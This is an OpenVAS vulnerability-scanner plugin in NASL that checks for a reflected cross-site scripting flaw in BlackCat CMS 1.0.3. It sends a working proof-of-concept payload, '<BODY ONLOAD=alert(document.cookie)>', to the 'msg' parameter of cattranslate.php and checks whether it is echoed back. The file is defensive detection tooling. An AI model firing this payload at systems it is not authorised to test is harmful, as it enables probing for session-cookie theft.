###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_blackcat_cms_xss_vuln.nasl 11869 2018-10-12 11:05:13Z cfischer $
#
# BlackCat CMS Reflected Cross-Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804749");
  script_version("$Revision: 11869 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:05:13 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-08-25 18:48:58 +0530 (Mon, 25 Aug 2014)");
  script_name("BlackCat CMS Reflected Cross-Site Scripting Vulnerability");

  script_tag(name:"summary", value:"This host is installed with BlackCat CMS and is prone to cross site
  scripting vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP GET request and check whether it is
  possible to read cookie or not.");
  script_tag(name:"insight", value:"Flaw is due to the modules/lib_jquery/plugins/cattranslate/cattranslate.php
  script not properly sanitize input to the 'attr' and 'msg' parameter before
  returning it to users.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.");
  script_tag(name:"affected", value:"BlackCat CMS version 1.0.3 and probably prior.");
  script_tag(name:"solution", value:"Apply the patch/update from the referenced advisory.");

  script_xref(name:"URL", value:"https://www.htbridge.com/advisory/HTB23228");
  script_xref(name:"URL", value:"http://forum.blackcat-cms.org/viewtopic.php?f=2&t=263");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://blackcat-cms.org");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

http_port = get_http_port(default:80);

if(!can_host_php(port:http_port)){
  exit(0);
}

foreach dir (make_list_unique("/", "/blackcat", "/blackcatcms", "/cms", cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item:string(dir, "/backend/start/index.php"),  port:http_port);

  if(">Black Cat CMS" >< rcvRes)
  {
    url = dir + '/modules/lib_jquery/plugins/cattranslate/cattranslate.php'
              + '?msg=%3CBODY%20ONLOAD=alert(document.cookie)%3E';

    ## Extra Check is not possible
    if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
       pattern:"<data><BODY ONLOAD=alert\(document.cookie\)></data>"))
    {
      report = report_vuln_url( port:http_port, url:url );
      security_message(port:http_port, data:report);
      exit(0);
    }
  }
}

exit(99);
